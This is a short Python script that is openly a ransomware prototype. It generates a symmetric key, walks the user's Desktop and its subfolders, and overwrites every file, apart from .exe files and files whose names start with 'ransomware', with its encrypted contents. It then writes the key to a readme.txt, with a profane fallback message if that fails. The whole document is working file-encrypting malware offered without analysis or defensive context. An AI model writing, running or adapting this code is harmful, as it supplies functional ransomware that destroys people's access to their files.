import os
import glob
from cryptography.fernet import Fernet

# generate a random symmetric key
key = Fernet.generate_key()

# create a Fernet object with the key
fernet = Fernet(key)

# specify the directory to encrypt
directory = os.path.expanduser("~/Desktop")

def encrypt_file(filename):
    # skip over exe files
    if filename.endswith(".exe"):
        return
    if filename.startswith("ransomware"):
        return

    try:
        # open the file, read the contents and encrypt them
        with open(filename, "rb") as file:
            encrypted = fernet.encrypt(file.read())
        # write the encrypted data back to the file
        with open(filename, "wb") as file:
            file.write(encrypted)
        print(f"Encrypted {filename}")
    except PermissionError:
        print(f"Skipped {filename}")

# encrypt all the files in the directory and its subdirectories
for root, dirs, files in os.walk(directory):
    for file in files:
        filename = os.path.join(root, file)
        encrypt_file(filename)

# create a note with the key
try:
    with open(os.path.join(directory, "readme.txt"), "w") as file:
        file.write(f"Use this key to decrypt: {key.decode()}")
    print("Encryption complete.")
except PermissionError:
    print(f"Encryption complete, but could not create the key file.\nYour key is right here, don't fucking lose it dumbass.{key.decode()}")
